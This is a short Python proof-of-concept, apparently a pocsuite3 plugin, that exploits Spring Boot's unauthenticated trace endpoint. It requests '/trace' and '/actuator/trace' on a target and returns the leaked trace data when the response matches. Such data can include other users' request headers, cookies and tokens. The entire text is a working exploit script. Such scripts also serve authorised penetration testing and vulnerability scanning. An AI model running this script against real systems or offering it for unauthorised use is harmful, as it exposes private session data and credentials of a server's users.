...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth trace Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/trace","/actuator/trace"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if '"timestamp"' in res.text and '"method"' in res.text and "application" in res.text:
                return res.text
